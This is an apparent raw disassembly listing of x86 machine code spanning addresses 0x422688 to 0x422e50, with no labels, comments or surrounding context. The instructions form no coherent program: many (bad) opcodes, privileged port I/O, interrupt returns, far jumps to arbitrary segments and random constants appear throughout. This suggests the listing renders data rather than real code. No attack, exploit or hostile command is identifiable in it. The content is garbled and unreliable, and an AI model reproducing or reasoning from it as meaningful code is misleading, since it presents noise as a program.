  422688:	mov    ds:0x231eb248,eax
  42268d:	ss jno 0x4226bd
  422690:	xor    eax,0x7aba1052
  422695:	iret   
  422696:	mov    ah,0xf
  422698:	jg     0x422629
  42269a:	test   eax,0x16d47c39
  42269f:	mov    edx,0x978212e5
  4226a4:	dec    eax
  4226a5:	xchg   esp,eax
  4226a6:	call   0xc948:0x2f939c99
  4226ad:	mov    edi,0x2b2430a
  4226b2:	adc    eax,0x93bde87
  4226b7:	xor    dh,BYTE PTR [esi-0xdfb3cfb]
  4226bd:	lock adc BYTE PTR [esi],0x36
  4226c1:	cmp    BYTE PTR [eax+0x4f],bl
  4226c4:	inc    edx
  4226c5:	ja     0x4226ab
  4226c7:	call   0xab62:0xe361aa2
  4226ce:	lods   eax,DWORD PTR ds:[esi]
  4226cf:	inc    eax
  4226d0:	ret    0x35c6
  4226d3:	sub    eax,0xda3b149c
  4226d8:	sbb    al,0x29
  4226da:	jecxz  0x4226cf
  4226dc:	test   al,0xc7
  4226de:	jmp    0x4226a6
  4226e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226e1:	nop
  4226e2:	pop    eax
  4226e3:	cli    
  4226e4:	sbb    ebx,DWORD PTR [esi-0x1a4b7f7b]
  4226ea:	sbb    al,0xee
  4226ec:	es pushf 
  4226ee:	pop    eax
  4226ef:	xchg   edx,eax
  4226f0:	popa   
  4226f1:	pop    ebx
  4226f2:	jecxz  0x4226be
  4226f4:	and    DWORD PTR [esi-0x63],esi
  4226f7:	dec    esi
  4226f8:	ss push esp
  4226fa:	addr16 xor esp,eax
  4226fd:	out    dx,al
  4226fe:	adc    esp,eax
  422700:	test   al,0x1c
  422702:	adc    esi,esi
  422704:	lea    esi,[ecx+0x40]
  422707:	fs popa 
  422709:	pusha  
  42270a:	aam    0xae
  42270c:	or     cl,BYTE PTR [ecx]
  42270e:	xlat   BYTE PTR ds:[ebx]
  42270f:	pop    ebp
  422710:	popa   
  422711:	mov    DWORD PTR [eax+ebx*2],ecx
  422714:	es in  eax,0xb9
  422717:	xchg   ecx,eax
  422718:	ret    0xd2d6
  42271b:	test   DWORD PTR [edi-0x5c],ecx
  42271e:	xor    BYTE PTR [eax+0xa],0xd5
  422722:	sub    al,0xe
  422724:	sub    edi,DWORD PTR [ebx]
  422726:	xchg   edx,eax
  422727:	aas    
  422728:	xchg   ebp,eax
  422729:	or     DWORD PTR [ebx-0x34],ebx
  42272c:	pusha  
  42272d:	or     cl,BYTE PTR [esp+eax*2+0x5c]
  422731:	jb     0x4226c6
  422733:	into   
  422734:	adc    bh,bl
  422736:	mov    ds:0x82bf47a0,eax
  42273b:	xor    esi,DWORD PTR [eax]
  42273d:	repz test DWORD PTR [ecx+0x2c9eb480],esi
  422744:	repz fst DWORD PTR [edi+0x35]
  422749:	xor    ecx,DWORD PTR fs:[eax+0x2f]
  42274d:	cmp    edx,0x41531871
  422753:	mov    cl,0x20
  422755:	dec    ebp
  422756:	push   cs
  422757:	stc    
  422758:	jo     0x4227b6
  42275a:	jae    0x4226fc
  42275c:	adc    cl,bh
  42275e:	mov    cl,0xe3
  422760:	inc    ebx
  422761:	dec    eax
  422762:	retf   
  422763:	dec    edi
  422764:	cmpxchg DWORD PTR [ecx],edx
  422767:	aad    0xce
  422769:	ret    
  42276a:	push   ebx
  42276b:	fwait
  42276c:	inc    esi
  42276d:	and    dl,BYTE PTR [eax]
  42276f:	push   ebp
  422770:	sub    al,0x71
  422772:	pop    esp
  422773:	mov    ds:0x18eac6e0,al
  422778:	or     al,BYTE PTR [eax-0x3fc6b22c]
  42277e:	repnz fist WORD PTR [eax+0x637ba78a]
  422785:	ret    0xcb71
  422788:	iret   
  422789:	or     al,0x4a
  42278b:	pop    esp
  42278c:	mov    WORD PTR [esp+eax*8+0x2fdd06f4],?
  422793:	push   ebp
  422794:	test   al,0xb
  422796:	test   edi,ebp
  422798:	loope  0x422781
  42279a:	out    0x7e,eax
  42279c:	in     al,dx
  42279d:	in     eax,0xb0
  42279f:	push   0xffffffa5
  4227a1:	fld    TBYTE PTR [edi-0x26]
	...
  4227b0:	add    BYTE PTR [edi+0x75],ah
  4227b3:	int3   
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	cmp    dh,BYTE PTR [eax]
  4227bf:	rol    DWORD PTR [edi+0x71],0xa0
  4227c3:	add    DWORD PTR [eax],eax
  4227c5:	stos   DWORD PTR es:[edi],eax
  4227c6:	add    eax,DWORD PTR [eax]
  4227c8:	add    BYTE PTR [edi+0x64],cl
  4227cb:	js     0x42279e
  4227cd:	hlt    
  4227ce:	mov    edx,0x13462461
  4227d3:	ror    DWORD PTR [edi],1
  4227d5:	mov    edi,0x9a216127
  4227da:	add    BYTE PTR [edi],dh
  4227dc:	mov    dh,0x54
  4227de:	and    DWORD PTR [ecx-0x6b],esi
  4227e1:	adc    BYTE PTR [ecx-0x2a],bl
  4227e4:	sbb    edi,DWORD PTR [edx+0x46ff7ac3]
  4227ea:	outs   dx,DWORD PTR ds:[esi]
  4227eb:	scas   al,BYTE PTR es:[edi]
  4227ec:	in     al,dx
  4227ed:	push   ecx
  4227ee:	add    DWORD PTR [eax],ecx
  4227f0:	or     BYTE PTR [eax-0x2390b23e],cl
  4227f6:	faddp  st(6),st
  4227f8:	iret   
  4227f9:	push   cs
  4227fa:	cmc    
  4227fb:	aad    0x1e
  4227fd:	fcmovnu st,st(6)
  4227ff:	fmul   st,st(6)
  422801:	add    eax,0x5c354050
  422806:	pop    edx
  422807:	mov    BYTE PTR es:[eax],bl
  42280a:	or     al,0xbd
  42280c:	sub    al,0xe9
  42280e:	xchg   DWORD PTR ds:0x3f52e4c0,ebp
  422814:	ds jp  0x422834
  422817:	dec    ebx
  422818:	dec    ebp
  422819:	sbb    DWORD PTR [ebx],ebp
  42281b:	xchg   DWORD PTR [ecx+edx*1-0x76],ebp
  42281f:	aad    0x3c
  422821:	sub    DWORD PTR [esp+edi*8+0x34508214],0xffffffa6
  422829:	xor    DWORD PTR [eax+ebx*2+0xfb45962],edx
  422830:	mov    esi,0x4c4652ec
  422835:	xchg   edx,eax
  422836:	push   ebx
  422837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422838:	stos   DWORD PTR es:[edi],eax
  422839:	xchg   ebp,eax
  42283a:	addr16 sub eax,esi
  42283d:	addr16 mov ds:0x3efe,al
  422841:	ja     0x42284a
  422843:	xor    eax,DWORD PTR [ebx]
  422845:	shr    BYTE PTR [edx+0x2c118c03],0xdf
  42284c:	xor    al,0x43
  42284e:	cmp    BYTE PTR [eax+0x48da758],cl
  422854:	jmp    0x4227ed
  422856:	mov    edi,ds
  422858:	ds inc eax
  42285a:	jno    0x42285c
  42285c:	jns    0x4228d6
  42285e:	push   es
  42285f:	xlat   BYTE PTR ds:[ebx]
  422860:	and    ebx,DWORD PTR [eax+ebx*2+0x56]
  422864:	push   ecx
  422865:	out    dx,eax
  422866:	or     BYTE PTR [esi-0x242f612d],0xd8
  42286d:	pusha  
  42286e:	dec    eax
  42286f:	cmp    BYTE PTR [ebx-0x12],ch
  422872:	jno    0x4228d7
  422874:	pop    ebx
  422875:	jne    0x42284b
  422877:	addr16 pop es
  422879:	xchg   edi,eax
  42287a:	test   al,0x11
  42287c:	push   es
  42287d:	cld    
  42287e:	adc    al,0xee
  422880:	jg     0x4228db
  422882:	pop    ds
  422883:	xchg   ebp,eax
  422884:	mov    ds:0x6b060b43,al
  422889:	aam    0xa1
  42288b:	fsubr  DWORD PTR [edi]
  42288d:	adc    DWORD PTR [ebx+eiz*1+0x6dfced25],edi
  422894:	sub    bh,dl
  422896:	and    eax,0x5d3e54af
  42289b:	je     0x422888
  42289d:	jae    0x42283d
  42289f:	jne    0x4228fc
  4228a1:	xchg   edx,eax
  4228a2:	mov    esi,ebx
  4228a4:	pop    ebp
  4228a5:	arpl   ax,bx
  4228a7:	pop    ss
  4228a8:	mov    eax,0xdda807c3
  4228ad:	popa   
  4228ae:	popf   
  4228af:	loope  0x422841
  4228b1:	xor    BYTE PTR [edx],ah
  4228b3:	hlt    
  4228b4:	sahf   
  4228b5:	inc    ecx
  4228b6:	fisubr WORD PTR [eax-0x49105291]
  4228bc:	dec    esp
  4228bd:	inc    edx
  4228be:	add    eax,0x3bc7742f
  4228c3:	fiadd  DWORD PTR [ecx+0x5a]
  4228c6:	mov    ch,0x8c
  4228c8:	and    eax,DWORD PTR [ebp-0x34d434e0]
  4228ce:	pop    eax
  4228cf:	lods   eax,DWORD PTR ds:[esi]
  4228d0:	(bad)  
  4228d1:	lock jmp 0x42291e
  4228d4:	inc    edi
  4228d5:	mov    BYTE PTR [ebp+0x69],ch
  4228d8:	je     0x422918
  4228da:	test   eax,0x105cf599
  4228df:	dec    edi
  4228e0:	int3   
  4228e1:	mov    DWORD PTR [ebp+0x37],ecx
  4228e4:	je     0x422923
  4228e6:	in     al,dx
  4228e7:	enter  0x9dd4,0x1d
  4228eb:	out    0x5e,eax
  4228ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ee:	in     al,0x55
  4228f0:	fld    st(4)
  4228f2:	adc    ebp,edi
  4228f4:	push   ds
  4228f5:	je     0x422964
  4228f7:	cmp    eax,0xfe1b5e78
  4228fc:	xchg   esi,eax
  4228fd:	jmp    0x4228c9
  4228ff:	xor    al,0xcc
  422901:	sbb    al,BYTE PTR ds:[edx]
  422904:	les    esp,FWORD PTR [esi+0x13162623]
  42290a:	pop    esp
  42290b:	out    dx,al
  42290c:	lods   eax,DWORD PTR ds:[esi]
  42290d:	inc    ebx
  42290e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42290f:	ins    BYTE PTR es:[edi],dx
  422910:	shr    BYTE PTR ds:0xa0f9fa07,0x91
  422917:	ins    BYTE PTR es:[edi],dx
  422918:	pusha  
  422919:	idiv   BYTE PTR [ebx+0x37]
  42291c:	je     0x422981
  42291e:	dec    esp
  42291f:	leave  
  422920:	and    edx,DWORD PTR [ebp-0x6b]
  422923:	leave  
  422924:	js     0x42299b
  422926:	mov    edx,edx
  422928:	mov    bl,0x69
  42292a:	gs pushf 
  42292c:	or     DWORD PTR [edx-0x57],eax
  42292f:	push   eax
  422930:	mov    eax,0xfecd7dbb
  422935:	cmp    BYTE PTR [ebx],al
  422937:	sbb    al,0xd3
  422939:	(bad)  
  42293a:	jp     0x42299a
  42293c:	out    dx,al
  42293d:	push   0xffffff91
  42293f:	cld    
  422940:	mov    eax,ds:0xb3dce566
  422945:	daa    
  422946:	test   eax,0xd7422159
  42294b:	sub    DWORD PTR [esi-0x37],0xd5c50aae
  422952:	imul   ebx,DWORD PTR [ebx+0x2d51bc13],0xffffffd3
  422959:	(bad)  
  42295a:	jmp    0x422931
  42295c:	push   eax
  42295d:	mov    es,ebp
  42295f:	mov    cl,0xc4
  422961:	out    dx,al
  422962:	dec    ebx
  422963:	aad    0x4c
  422965:	or     dl,ah
  422967:	adc    DWORD PTR [edx],esi
  422969:	jo     0x422939
  42296b:	jo     0x42296c
  42296d:	and    cl,BYTE PTR [ecx+0x1cd53502]
  422973:	outs   dx,DWORD PTR ds:[esi]
  422974:	arpl   WORD PTR [ebp-0x7e],bp
  422977:	lahf   
  422978:	push   edi
  422979:	int    0x7
  42297b:	rcr    BYTE PTR [ecx-0x23bea627],1
  422981:	xchg   ecx,eax
  422982:	out    0x73,al
  422984:	clc    
  422985:	mov    dh,dh
  422987:	pop    ebp
  422988:	inc    ecx
  422989:	cmp    eax,0x508cde94
  42298e:	jp     0x4229c5
  422990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422991:	xchg   ebp,eax
  422992:	fild   QWORD PTR [edi]
  422994:	push   ds
  422995:	dec    edx
  422996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422997:	std    
  422998:	jmp    0x66a4:0x3bb390c8
  42299f:	mov    ecx,DWORD PTR [ecx-0x64]
  4229a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229a3:	int    0xfe
  4229a5:	in     al,0x3b
  4229a7:	stc    
  4229a8:	jnp    0x422a1a
  4229aa:	add    DWORD PTR [ebp+0x71e0a0c4],ebp
  4229b0:	jns    0xebbb80a6
  4229b6:	dec    esi
  4229b7:	(bad)
  4229ba:	pop    es
  4229bb:	dec    ebp
  4229bc:	dec    ecx
  4229bd:	into   
  4229be:	lock or DWORD PTR [edi+0x48b6f2fa],ebx
  4229c5:	push   esp
  4229c6:	sar    ecx,0x7a
  4229c9:	pop    eax
  4229ca:	jne    0x4229a2
  4229cc:	dec    eax
  4229cd:	mov    ebx,0x472701c
  4229d2:	push   ecx
  4229d3:	sbb    DWORD PTR [edx],esi
  4229d5:	add    eax,0xc2f39a98
  4229da:	cmp    DWORD PTR [edi+0x3b],edx
  4229dd:	push   cs
  4229de:	pop    ds
  4229df:	popf   
  4229e0:	das    
  4229e1:	loopne 0x422990
  4229e3:	outs   dx,BYTE PTR ds:[esi]
  4229e4:	ja     0x4229b1
  4229e6:	xor    BYTE PTR [ecx-0x63a03590],ah
  4229ec:	adc    dl,al
  4229ee:	xchg   ecx,eax
  4229ef:	js     0x422a37
  4229f1:	push   edi
  4229f2:	mov    edi,esp
  4229f4:	cwde   
  4229f5:	aas    
  4229f6:	(bad)  
  4229f8:	lods   al,BYTE PTR ds:[esi]
  4229f9:	dec    edi
  4229fa:	sahf   
  4229fb:	loopne 0x422a2e
  4229fd:	repnz push cs
  4229ff:	jmp    0xd22479f1
  422a04:	xchg   edi,eax
  422a05:	fbstp  TBYTE PTR cs:[eax-0x28692436]
  422a0c:	es cli 
  422a0e:	clc    
  422a0f:	das    
  422a10:	cmp    DWORD PTR [ebx],esp
  422a12:	in     al,dx
  422a13:	div    DWORD PTR [ebx]
  422a15:	pop    ebp
  422a16:	jecxz  0x4229e1
  422a18:	dec    esp
  422a19:	push   ebx
  422a1a:	mov    ch,0x7d
  422a1c:	mov    eax,ds:0xb19f79b0
  422a21:	ins    DWORD PTR es:[edi],dx
  422a22:	in     eax,dx
  422a23:	sub    ch,dl
  422a25:	loop   0x4229f2
  422a27:	loop   0x422a09
  422a29:	jns    0x422a1b
  422a2b:	pusha  
  422a2c:	ror    BYTE PTR [ecx-0x76],cl
  422a2f:	push   0x1921ab41
  422a34:	(bad)  
  422a35:	rcl    ecx,cl
  422a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a38:	imul   edi,DWORD PTR [ebp-0x77],0x5e
  422a3c:	or     al,0x37
  422a3e:	pop    esp
  422a3f:	pop    edi
  422a40:	mov    dh,0x1c
  422a42:	or     eax,0x12f156b4
  422a47:	cmp    DWORD PTR ds:0x617d4e20,ecx
  422a4d:	ss in  eax,0x6e
  422a50:	add    ebp,DWORD PTR [eax]
  422a52:	imul   edi,edi,0xb929d734
  422a58:	in     al,dx
  422a59:	dec    edi
  422a5a:	mov    ds:0xd4a1d2b1,eax
  422a5f:	mov    eax,0xb0854b48
  422a64:	add    BYTE PTR [edx],bh
  422a66:	mov    DWORD PTR [esi-0x79],esp
  422a69:	inc    edx
  422a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a6b:	push   0x4eaca11
  422a70:	out    dx,eax
  422a71:	loop   0x422aec
  422a73:	fdiv   st,st(2)
  422a75:	and    al,0x2a
  422a77:	pop    esi
  422a78:	dec    esi
  422a79:	xchg   edx,eax
  422a7a:	mov    ecx,DWORD PTR [edi+ebp*4+0x77]
  422a7e:	gs cwde 
  422a80:	push   edx
  422a81:	stc    
  422a82:	inc    edx
  422a83:	dec    esp
  422a84:	inc    ecx
  422a85:	sub    DWORD PTR [ecx-0x6c3bdd32],0xffffffe0
  422a8c:	mov    DWORD PTR [ecx+0x27],ebp
  422a8f:	pop    ecx
  422a90:	sahf   
  422a91:	dec    ecx
  422a92:	fisubr WORD PTR [edx]
  422a94:	xor    eax,0x4c5fb620
  422a99:	push   ss
  422a9a:	xchg   esi,eax
  422a9b:	mov    ecx,0x20a9831
  422aa0:	push   edi
  422aa1:	in     al,dx
  422aa2:	add    DWORD PTR [ebp-0x3e],ecx
  422aa5:	scas   al,BYTE PTR es:[edi]
  422aa6:	or     eax,0xf0b89137
  422aab:	mov    dl,0x54
  422aad:	std    
  422aae:	mov    edi,0x3cf3850c
  422ab3:	rep outs dx,DWORD PTR ds:[esi]
  422ab5:	mov    bl,0x16
  422ab7:	adc    al,bl
  422ab9:	xlat   BYTE PTR ds:[ebx]
  422aba:	dec    edi
  422abb:	(bad)  
  422abc:	jmp    0x62fe:0xcaf41d1b
  422ac3:	sbb    ebx,DWORD PTR [edx]
  422ac5:	mov    bh,0xe0
  422ac7:	xchg   edi,eax
  422ac8:	inc    edi
  422ac9:	xchg   ecx,eax
  422aca:	xchg   eax,ecx
  422acc:	or     al,0xdb
  422ace:	leave  
  422acf:	cs mov edi,0x17f92902
  422ad5:	loope  0x422acf
  422ad7:	jb     0x422b1a
  422ad9:	popf   
  422ada:	setns  dl
  422add:	sbb    al,0x62
  422adf:	mov    ebx,0xca6f8f1d
  422ae4:	mov    ebp,0x5a2f62a5
  422ae9:	mov    dh,0xa8
  422aeb:	mov    ebp,0xc39d8768
  422af0:	lods   eax,DWORD PTR ds:[esi]
  422af1:	in     eax,dx
  422af2:	xchg   edi,eax
  422af3:	outs   dx,BYTE PTR ds:[esi]
  422af4:	xor    BYTE PTR [edi-0x40708067],dh
  422afa:	test   eax,0x69abb1f9
  422aff:	clc    
  422b00:	lahf   
  422b01:	jb     0x422b2e
  422b03:	ret    
  422b04:	sub    DWORD PTR [ebx+0x5c],ebx
  422b07:	xchg   ecx,eax
  422b08:	out    dx,al
  422b09:	retf   
  422b0a:	icebp  
  422b0b:	loope  0x422b3a
  422b0d:	(bad)  
  422b0e:	mov    esp,0xacb725d1
  422b13:	push   edx
  422b14:	pop    ss
  422b15:	push   ebx
  422b16:	jns    0x422af6
  422b18:	mov    cl,0x24
  422b1a:	or     al,0x11
  422b1c:	shl    BYTE PTR [edx+0x11ba94f6],cl
  422b22:	sar    BYTE PTR [ebx-0x5ed07ca],1
  422b28:	std    
  422b29:	xlat   BYTE PTR ds:[ebx]
  422b2a:	(bad)  
  422b2b:	iret   
  422b2c:	or     eax,0x90512753
  422b31:	xchg   BYTE PTR [edx],ch
  422b33:	dec    ebp
  422b34:	push   es
  422b35:	xor    eax,0x8dff5ca7
  422b3a:	(bad)  
  422b3b:	pusha  
  422b3c:	pushf  
  422b3d:	or     BYTE PTR [ebx-0x6e1e5634],bh
  422b43:	mov    edi,0x9b20e31c
  422b48:	adc    ebx,DWORD PTR [ecx]
  422b4a:	push   edx
  422b4b:	rol    al,cl
  422b4d:	push   edx
  422b4e:	xor    cl,BYTE PTR ds:0x266dcf0f
  422b54:	mov    al,ds:0x88c102ca
  422b59:	pushf  
  422b5a:	cmc    
  422b5b:	cdq    
  422b5c:	adc    eax,edi
  422b5e:	xchg   esi,eax
  422b5f:	int3   
  422b60:	stos   BYTE PTR es:[edi],al
  422b61:	xchg   DWORD PTR [eax],ebp
  422b63:	arpl   WORD PTR [esp+ebp*1],cx
  422b66:	sbb    ah,BYTE PTR [edx+0x5872b112]
  422b6c:	out    0x9f,eax
  422b6e:	and    dl,BYTE PTR [ecx+0x596ae838]
	...
  422b80:	add    BYTE PTR [eax-0x43f64bd4],ah
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    dh,bh
  422b8e:	outs   dx,BYTE PTR ds:[esi]
  422b8f:	add    ebp,DWORD PTR [edi]
  422b91:	sbb    al,0xa4
  422b93:	add    DWORD PTR [eax],eax
  422b95:	stos   DWORD PTR es:[edi],eax
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    BYTE PTR [edx+0x35bb85f1],ah
  422b9e:	fbstp  TBYTE PTR [ecx+esi*1-0x30076f5c]
  422ba5:	sub    esp,DWORD PTR [esi+0x6f]
  422ba8:	popf   
  422ba9:	adc    ch,bl
  422bab:	and    DWORD PTR [esp+edx*8-0xc4764d5],0x66066ccf
  422bb6:	shr    bh,1
  422bb8:	sbb    eax,0x780df862
  422bbd:	jmp    0x422bb8
  422bbf:	sub    ebp,0xfc59a76a
  422bc5:	test   BYTE PTR [eax],ch
  422bc7:	and    eax,0x21a0209
  422bcc:	cmp    DWORD PTR [ecx+ebp*8+0x5d],ebx
  422bd0:	adc    eax,0x206f132b
  422bd5:	sub    eax,0xb6a7e88e
  422bda:	and    ebx,DWORD PTR [ecx+0x1896a4b]
  422be0:	ss push ebp
  422be2:	sub    BYTE PTR [ebx-0x45],dh
  422be5:	out    0x3c,al
  422be7:	add    al,0x76
  422be9:	in     al,dx
  422bea:	inc    ebp
  422beb:	adc    edx,DWORD PTR [eax]
  422bed:	sub    BYTE PTR gs:[ebx],dh
  422bf0:	dec    ebp
  422bf1:	or     BYTE PTR [ebx-0x249ed55],0xcf
  422bf8:	lock sub DWORD PTR [esi-0x67],ebx
  422bfc:	sub    eax,0xa0a23844
  422c01:	sti    
  422c02:	mov    esp,0xcd5eae44
  422c07:	lahf   
  422c08:	sbb    DWORD PTR [esi-0x38],ebx
  422c0b:	jp     0x422bc1
  422c0d:	mov    ebp,0xfa2b29ab
  422c12:	cli    
  422c13:	adc    ah,BYTE PTR es:[eax+0xe]
  422c17:	xchg   BYTE PTR [eiz*2+0x616e68e7],bl
  422c1e:	mov    esi,0xf6227498
  422c23:	pop    ebx
  422c24:	ror    edi,0x3b
  422c27:	cwde   
  422c28:	jmp    0xb3f6d636
  422c2d:	ja     0x422c98
  422c2f:	xor    DWORD PTR [edi-0x78],edi
  422c32:	mov    cl,0xa
  422c34:	ss std 
  422c36:	add    eax,0x79aa4ac5
  422c3b:	je     0x422bf8
  422c3d:	mov    dl,0x78
  422c3f:	rcr    BYTE PTR [edx-0x56660a18],cl
  422c45:	sub    eax,0x9794c06b
  422c4a:	jno    0x422cb1
  422c4c:	dec    ebp
  422c4d:	jae    0x422c16
  422c4f:	mov    dl,0xe7
  422c51:	adc    eax,0x9a890fa3
  422c56:	jmp    0x25a7:0x943a5f4f
  422c5d:	retf   
  422c5e:	arpl   WORD PTR [edx],bx
  422c60:	jmp    0x422c4c
  422c62:	(bad)
  422c65:	mov    edx,0xf3ccdeb0
  422c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c6b:	push   edi
  422c6c:	inc    ecx
  422c6d:	sub    edx,ecx
  422c6f:	cmp    DWORD PTR [esi-0x61],esp
  422c72:	push   esp
  422c73:	(bad)  
  422c74:	push   ebx
  422c75:	xchg   DWORD PTR [edx-0x3ec2a830],esi
  422c7b:	push   esp
  422c7d:	cdq    
  422c7e:	test   al,0xad
  422c80:	dec    esp
  422c81:	out    dx,al
  422c82:	hlt    
  422c83:	add    DWORD PTR [eax-0x4e],0x246f8985
  422c8a:	add    dh,al
  422c8c:	fiadd  DWORD PTR [ecx-0x778bb388]
  422c92:	(bad)  
  422c93:	mov    edx,0xd7d971d8
  422c98:	dec    ebx
  422c99:	xlat   BYTE PTR es:[ebx]
  422c9b:	mov    BYTE PTR [edi],cl
  422c9d:	xchg   DWORD PTR [edi+0x3a943b3d],ebx
  422ca3:	sbb    DWORD PTR [esi-0xe],eax
  422ca6:	mov    ah,BYTE PTR [edi-0x2a]
  422ca9:	mov    edx,0x70ddb5ca
  422cae:	jmp    0x422cd2
  422cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb1:	add    DWORD PTR [ebx-0x5626a278],edi
  422cb7:	jmp    0x422cc9
  422cb9:	mov    edi,0xb6d8a943
  422cbe:	xchg   edi,eax
  422cbf:	ss inc ebp
  422cc1:	add    bl,dh
  422cc3:	jmp    0x98a8:0x337f3535
  422cca:	push   ebp
  422ccb:	bound  esp,QWORD PTR [ecx]
  422ccd:	mov    ah,0x82
  422ccf:	test   DWORD PTR [edx],edx
  422cd1:	cwde   
  422cd2:	sub    cl,BYTE PTR [ecx+0x6f]
  422cd5:	sub    dl,dl
  422cd7:	pop    ds
  422cd8:	int3   
  422cd9:	xor    cl,BYTE PTR [edx+eax*8]
  422cdc:	cmp    DWORD PTR [ecx+0xbbc4ee1],esp
  422ce2:	mov    cl,0xfb
  422ce4:	mov    edi,eax
  422ce6:	popa   
  422ce7:	push   cs
  422ce8:	retf   
  422ce9:	fimul  DWORD PTR [eax-0x2686fb9c]
  422cef:	adc    esp,DWORD PTR [ebx+0x5f]
  422cf2:	test   al,0xa0
  422cf4:	in     al,0x68
  422cf6:	imul   ebx,DWORD PTR [edx+ecx*8],0x18
  422cfa:	push   ebp
  422cfb:	push   esp
  422cfc:	push   ecx
  422cfd:	mov    esp,0x2a113b64
  422d02:	and    eax,0x4f1345e4
  422d07:	mov    eax,0x5225e0cd
  422d0c:	rcr    DWORD PTR [edx+0x75],0xa0
  422d10:	in     eax,dx
  422d11:	adc    al,0xe2
  422d13:	fist   DWORD PTR [ebx+ebp*4]
  422d16:	scas   eax,DWORD PTR es:[edi]
  422d17:	push   0x851a992
  422d1c:	rcl    BYTE PTR [edi-0x42],1
  422d1f:	inc    ecx
  422d20:	dec    ebp
  422d21:	je     0x422da1
  422d23:	push   esi
  422d24:	cmc    
  422d25:	fsubr  DWORD PTR [edi-0x69]
  422d28:	jb     0x422d40
  422d2a:	xchg   edi,eax
  422d2b:	mov    ds:0xd069a30f,al
  422d30:	repz fadd DWORD PTR [ecx-0x709d4822]
  422d37:	retf   0xb38a
  422d3a:	dec    esp
  422d3b:	jp     0x422d0e
  422d3d:	and    eax,0x152debbf
  422d42:	fld    QWORD PTR [eax+0x31]
  422d46:	out    0x52,al
  422d48:	cs xchg esp,eax
  422d4a:	ins    DWORD PTR es:[edi],dx
  422d4b:	fldenv [ebx-0x3a7d734e]
  422d51:	mov    WORD PTR [ecx+0x4b25b4dc],gs
  422d57:	ins    DWORD PTR es:[edi],dx
  422d58:	pop    ds
  422d59:	out    dx,al
  422d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d5b:	in     eax,dx
  422d5c:	into   
  422d5d:	jbe    0x422d1a
  422d5f:	xchg   DWORD PTR [edi],ebx
  422d61:	xchg   edx,eax
  422d62:	(bad)  
  422d63:	jg     0x422dc4
  422d65:	or     esp,DWORD PTR [edi]
  422d67:	mov    edi,0x59b24f0c
  422d6c:	jle    0x422d88
  422d6e:	push   ecx
  422d6f:	xchg   esp,eax
  422d70:	(bad)  
  422d71:	cmp    BYTE PTR [esi-0x24],bl
  422d74:	cmp    eax,0x28bf1700
  422d79:	adc    eax,0x617aa890
  422d7e:	stc    
  422d7f:	fbld   TBYTE PTR [edi-0x28]
  422d82:	add    eax,0xba8bb507
  422d87:	push   edx
  422d88:	scas   eax,DWORD PTR es:[edi]
  422d89:	dec    edi
  422d8a:	pop    ebp
  422d8b:	icebp  
  422d8c:	mov    bl,0xb7
  422d8e:	mov    ds:0x67d5dbce,eax
  422d93:	xlat   BYTE PTR ds:[ebx]
  422d94:	mov    eax,ds:0x82cfc043
  422d99:	add    ebx,eax
  422d9b:	dec    eax
  422d9c:	jae    0x422d9c
  422d9e:	popa   
  422d9f:	mov    cs:0x50097e46,al
  422da5:	or     DWORD PTR [ebx-0x70682601],ecx
  422dab:	mov    WORD PTR [edi-0x4fca37ea],fs
  422db1:	cli    
  422db2:	fidiv  DWORD PTR [esi+ebp*2-0x4b]
  422db6:	push   ebx
  422db7:	or     eax,0xd22dbb78
  422dbc:	sub    ebx,DWORD PTR [ebp-0x9d2a9ad]
  422dc2:	mov    esp,0x291034e6
  422dc7:	aas    
  422dc8:	fcmovb st,st(3)
  422dca:	test   al,0x8f
  422dcc:	stc    
  422dcd:	add    cl,bh
  422dcf:	iret   
  422dd0:	dec    ebp
  422dd1:	jno    0x422dd0
  422dd3:	out    0x29,al
  422dd5:	add    bh,BYTE PTR [ecx+eax*2-0x66a15438]
  422ddc:	jnp    0x422e2e
  422dde:	test   DWORD PTR [esp+ebx*2+0x670f5bf3],ebx
  422de5:	inc    eax
  422de6:	add    ebp,DWORD PTR ds:0xcfb2fa42
  422dec:	out    dx,eax
  422ded:	aad    0x44
  422def:	mov    edi,0x2a7d33bb
  422df4:	xchg   ecx,eax
  422df5:	xor    BYTE PTR [ebx+0x79e0ff68],bl
  422dfb:	sub    eax,DWORD PTR [ebp-0x38]
  422dfe:	call   DWORD PTR [ecx+0x6adb8523]
  422e04:	loopne 0x422e7e
  422e06:	call   0xcb48fa01
  422e0b:	pop    ebp
  422e0c:	pop    ecx
  422e0d:	or     DWORD PTR [ebx-0x40],0x53
  422e11:	sbb    BYTE PTR [esi-0x5e],dh
  422e14:	cdq    
  422e15:	stc    
  422e16:	cdq    
  422e17:	inc    eax
  422e18:	push   es
  422e19:	mov    ah,0xe3
  422e1b:	jbe    0x422e72
  422e1d:	fmul   QWORD PTR [ecx]
  422e1f:	xchg   ecx,eax
  422e20:	push   edi
  422e21:	scas   eax,DWORD PTR es:[edi]
  422e22:	jb     0x422e5e
  422e24:	lock mov eax,ds:0xab4acf0d
  422e2a:	push   ss
  422e2b:	xor    edx,DWORD PTR [edx+0xc526985]
  422e31:	cld    
  422e32:	fwait
  422e33:	into   
  422e34:	mov    eax,ds:0x40fd4c98
  422e39:	imul   edi,DWORD PTR [edx],0x53fbe13d
  422e3f:	push   0xa4d2e7dc
  422e44:	retf   0xf721
  422e47:	mov    bl,0x63
  422e49:	popa   
  422e4a:	pop    edi
  422e4b:	and    esp,DWORD PTR [esi+0x2c]
  422e4e:	pusha  
  422e4f:	cli    
  422e50:	sbb    al,0x33
